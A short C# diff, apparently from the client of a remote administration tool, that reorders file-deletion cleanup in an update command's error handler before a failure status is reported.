@@ -59,9 +59,9 @@ namespace xClient.Core.Commands
                 }
                 catch (Exception ex)
                 {
-                    NativeMethods.DeleteFile(filePath);
                     if (_renamedFiles.ContainsKey(command.ID))
                         _renamedFiles.Remove(command.ID);
+                    NativeMethods.DeleteFile(filePath);
                     new Packets.ClientPackets.SetStatus(string.Format("Update failed: {0}", ex.Message)).Execute(client);
                 }
 
